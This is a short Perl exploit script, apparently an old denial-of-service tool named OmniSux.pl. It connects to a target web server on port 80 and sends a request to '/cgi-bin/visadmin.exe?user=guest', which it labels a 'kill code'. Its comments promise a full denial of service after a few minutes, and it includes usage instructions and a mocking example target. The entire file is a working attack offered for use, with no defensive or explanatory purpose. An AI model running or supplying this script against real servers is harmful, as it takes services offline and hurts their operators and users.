#!/usr/bin/perl
#######
#
# OmniSux.pl
# Code: philer
# email:philer@hackermail.com
#
# Notes:
# After starting script let it
# run for a few minutes to get
# a full Denial of Service.
#
# - Usage: ./omnisux <host>
#
#######

use IO::Socket;

if ($ARGC[0] == "") {
   print "--- OmniSux.pl.  Code: philer ---\n";
   print "Usage: ./omnisux.pl <host>\n";
   print "Example: ./omnisux.pl www.microshit.com\n";
   exit
}

$host   = $ARGV[0];
$port   = 80;
$sploit = "/cgi-bin/visadmin.exe?user=guest";

print "Kill code: $sploit\n";

$sock = IO::Socket::INET->new(PeerAddr => $host,
                              PeerPort => $port,
                              Proto    => 'tcp',) or die "Damn! Can't connect..\n";

print <<"EOT";

--- OmniSux.pl.  Code: philer ---
Usage: ./omnisux.pl <host>
Example: ./omnisux.pl www.microshit.com

EOT

print $sock "GET $sploit\n";
print "Connected to $host and sending kill code.\n";
print "Let script hang of at least two minutes.\n";
   sleep(120);
print "Done!\n";